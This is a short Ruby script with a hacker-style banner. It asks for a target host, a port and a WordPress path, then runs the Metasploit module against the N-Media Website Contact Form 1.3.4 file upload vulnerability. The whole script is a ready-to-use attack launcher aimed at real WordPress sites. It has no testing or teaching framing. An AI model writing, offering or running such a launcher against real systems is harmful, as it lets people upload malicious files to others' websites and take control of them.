require 'colorize'
puts """
      Th3 M4d_Sc13nT15t is here to stay...

  We trust you have received teh usual lecture
      from the local System Administrator. 

 It usually boils down to these three things:
		#1) Respect the privacy of others.
		#2) Think before you type.
		#3) With great poewr comes great responsibility.""".white
puts """
     Wordpress N-Media Website Contact Form
             Upload Vulnerability

       N-Media WebSite Contact Form 1.3.4
         
""".red


puts " [?] What is the target? ".blue
print "[!] ---> ".yellow
target = gets.chomp

puts " [?] What is the port? ".blue
print " [!] ---> ".yellow
port = gets.chomp


puts " [?] The base path to the wordpress application? ".blue
print " [!] ---> ".yellow
path = gets.chomp



exec("msfconsole -x 'use exploit/unix/webapp/wp_nmediawebsite_file_upload' -x 'setg RHOST #{target}' -x 'setg RPORT #{port}' -x 'setg TARGETURI #{path}' -x 'run'")

